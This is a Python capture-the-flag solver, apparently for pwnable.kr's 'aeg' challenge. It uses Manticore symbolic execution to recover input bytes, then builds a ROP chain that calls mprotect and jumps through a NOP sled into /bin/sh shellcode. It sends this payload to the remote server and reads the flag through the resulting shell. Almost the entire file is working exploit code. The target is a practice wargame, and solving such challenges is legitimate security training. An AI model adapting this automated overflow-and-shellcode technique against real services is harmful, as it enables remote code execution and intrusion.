#!/usr/bin/env python
# solve aeg on pwnable.kr with manticore
# its not fast enough but ima try to change that (read below)
# original angr solution runs in ~9 secs
# (new solution runs in ~5 !)

# solution with auto_load=False and newest version
# of manticore is EVEN FASTER than angr

# this solution works more often however
# sometimes the "stack" runs out of space
# works 4 out of 5 times

from manticore.native import Manticore
from manticore.native.manticore import _make_linux as make_linux

import logging
#logging.getLogger("manticore.native.*").setLevel(logging.DEBUG)
#logging.getLogger("manticore.platforms.linux").setLevel(logging.DEBUG)

from subprocess import check_output
import sys
import re
import time

from pwn import *
context.arch='amd64'

class AEG:
    def __init__(self, path):
        self.path = path

    def symbolic_execution(self, targets):
        log.info("Starting symbolic execution...")

        linux = make_linux(self.path, auto_load=False)

        m = Manticore(linux)
        m.verbosity(0) # change to 2 for debugging

        buf_addr = targets["buf_addr"]

        # reached the goal (memcpy call)
        def reached_goal(state):
            con_buf = state.solve_buffer(buf_addr, 48)

            with m.locked_context() as context:
                context["magic_values"] = con_buf

            m.terminate()

        m.add_hook(targets["goal"], reached_goal)

        #skip intro shit
        def skip_intro(state):
            buf = state.new_symbolic_buffer(48) # buffer we will solve
            state.cpu.write_bytes(buf_addr, buf)
            state.cpu.RIP = targets["check_start"]

        m.add_hook(self.binary.symbols[b"__libc_start_main"], skip_intro)

        # never take jumps for failed solutions
        def constrain_jump(state):
            state.constrain(state.cpu.ZF == 1) 

        for jne_addr in targets["jnes"]:
            m.add_hook(jne_addr, constrain_jump)

        m.run(procs=2) 

        magic_values = m.context["magic_values"]

        return magic_values

    def generate_exploit(self, magic, addr, last_mov, xors):
        log.info('Crafting final exploit')

        r = ROP(self.binary)
        shellcode = asm(shellcraft.amd64.sh())
        
        ret = r.find_gadget(["ret"])
        pop_rdi = r.find_gadget(["pop rdi", "ret"])
        pop_rbp = r.find_gadget(["pop rbp", "ret"])
        pop_rsi = r.find_gadget(["pop rsi", "pop r15", "ret"])
        
        page_size = 2**12
        mask = page_size - 1
        
        #exploit calls mprotect to make the input executable and then jumps into the shellcode
        exp_str = (
            p64(ret.address)*90 +
            p64(pop_rbp.address) +
            p64(addr+48+48+91*8+4) +
            p64(ret.address)*4 +
            p64(last_mov) + 
            p32(0x7) + p64(0x0) + 
            p64(pop_rdi.address) + 
            p64(addr & ~mask) + 
            p64(pop_rsi.address) + 
            p64(0x1000) + 
            b"JUNKJUNK" + 
            p64(self.binary.symbols[b"mprotect"]) + 
            p64(addr+48+48+97*8+32) + 
            b"\x90"*64 + # nop sled
            shellcode
        )
        
        #print input.values() + magic
        exploit = self.format_input(magic + list(exp_str), xors)
        return exploit

    def download_program(self):
        self.conn = remote("pwnable.kr", 9005)

        line = b"" 
        while b"wait..." not in line:
            line = self.conn.readline()

        b64program = self.conn.readline()
        program = base64.b64decode(b64program.strip())

        progfile = open(self.path+".z", "wb+")
        progfile.write(program)
        progfile.close()

        subprocess.call(["uncompress", "--force", self.path+".z"])
        subprocess.call(["chmod", "766", self.path])

        log.info("Program decompressed and executable")

        #self.conn.close()

    # parse objdump to get necessary info
    # not sexy but its overkill to do anything else
    # nevermind i need some beter static analysis
    def parse_disassembly(self):

        disasm = check_output(["objdump", "-d", "-M", "intel", "-j", ".text", self.path]).decode()

        xors = re.findall("([0-9a-f]+):.*?\s+xor\s+eax,(0x[0-9a-f]+)", disasm)
        jnes = re.findall("([0-9a-f]+):.*?\s+jne", disasm)
        #leaves = re.findall("([0-9a-f]+):\s+[0-9a-f ]{8}\s+leave", disasm) # dont need these anymore
        goal = int(re.findall("([0-9a-f]+):.*?<memcpy@plt>", disasm)[0], 16)
        cmp_start = int(re.findall("([0-9a-f]+):.*?cmp\s+DWORD PTR \[rbp-0x24\],0x2", disasm)[0], 16)
        check_start = re.findall("([0-9a-f]+):.*?movzx\s+eax,BYTE.*?# ([0-9a-f]+)", disasm)[-1]
        all_mov = re.findall("([0-9a-f]+):\s+[0-9a-f ]+\s+movzx\s+edx,BYTE PTR \[rbp-0x4\](.*?jne)", disasm, re.DOTALL)
        # ^ this is a bit fucked up, this is why i used the angr static analysis before

        last_mov = all_mov[-1][0]
        for mov in all_mov:
            if "edx," not in mov[1]:
                last_mov = mov[0] # yeaaaah 
                break

        targets = {}

        targets["cmp_start"] = cmp_start # cmp in main to skip to checking
        targets["check_start"] = int(check_start[0], 16)-20 # where the checking starts
        targets["print"] = cmp_start+11 # puts in main
        targets["buf_addr"] = int(check_start[1], 16) # where the buffer starts
        targets["goal"] =  goal
        targets["xors"] = [int(x[1], 16) for x in xors]
        targets["jnes"] = [int(x, 16) for x in jnes]
        #targets["leaves"] = [int(x, 16)-1 for x in leaves] # -1 to go to the nop, nvmd dont need
        targets["last_mov"] = int(last_mov, 16)

        return targets

    def format_input(self, input, xors):
        res = ''
        
        count = 0
        for i in input:
            res += "%02x" % (i ^ (xors[count % 2] & 0xff)) 
            count += 1
            
        return res
        
    def run(self):
        self.download_program()
        self.binary = ELF(self.path)

        targets = self.parse_disassembly()

        log.info("BUFFER ADDR: 0x%016x" % targets["buf_addr"])

        magic = self.symbolic_execution(targets)
        log.info("MAGIC: %s" % magic)
        exploit = self.generate_exploit(magic, targets["buf_addr"], targets["last_mov"], targets["xors"])
        log.info("EXPLOIT: %s" % exploit)

        #gdb.debug([path, exploit], "b * 0x%016x\n" % (targets["goal"]+6))
        #input()

        self.conn.read()
        self.conn.send(exploit + "\n")
        time.sleep(0.5)
        self.conn.send("cat flag\n")

        flag = self.conn.read()
        print()
        log.info("FLAG: %s" % flag.decode())

if __name__ == "__main__":
    aeg = AEG("aeg_program")
    aeg.run()

